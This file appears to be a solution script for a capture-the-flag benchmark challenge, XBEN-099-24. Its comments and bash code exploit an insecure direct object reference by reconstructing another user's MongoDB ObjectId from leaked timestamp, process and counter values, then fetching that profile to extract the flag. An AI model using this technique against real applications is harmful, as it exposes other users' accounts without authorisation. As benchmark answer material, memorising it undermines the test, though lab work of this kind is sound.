#!/usr/bin/env bash
# XBEN-099-24 — "Get the first" (tags: idor)
#
# `/profile/:id` renders whatever user the URL names, with no session check at
# all, and prints the flag when the id is the first user's. So the whole problem
# is knowing that id — and a MongoDB ObjectId is not a secret, it is a structure:
# four bytes of unix time, five bytes that stay the same for the life of the
# process, and a three-byte counter that increments per document.
#
# The application hands over all three. `/starttime` is when the first user was
# created; registering gives an id of our own, which carries the same five
# process bytes; and the registration response says how far our counter is from
# the target's, as a helpful hint.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben099-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/register" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/register' \
    --set "form.username=probe$$" --set 'form.password=pw' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
mine="$("$H5I" websec show "res_$seq" --session "$SESSION")"

"$H5I" browser navigate "$URL/starttime" --session "$SESSION" >/dev/null
started="$("$H5I" browser markdown --session "$SESSION" | grep -oE '\b1[0-9]{9}\b' | head -1)"

first="$(python3 -c "
import json, re, sys
body = json.loads(sys.argv[1])['response']['body']['text']
row = json.loads(body)
mine, distance = row['userId'], int(row['distance'])
# time | process | counter, and only the ends need changing.
print('%08x%s%06x' % (int(sys.argv[2]), mine[8:18], int(mine[18:24], 16) - distance))
" "$mine" "$started")"

"$H5I" browser navigate "$URL/profile/$first" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
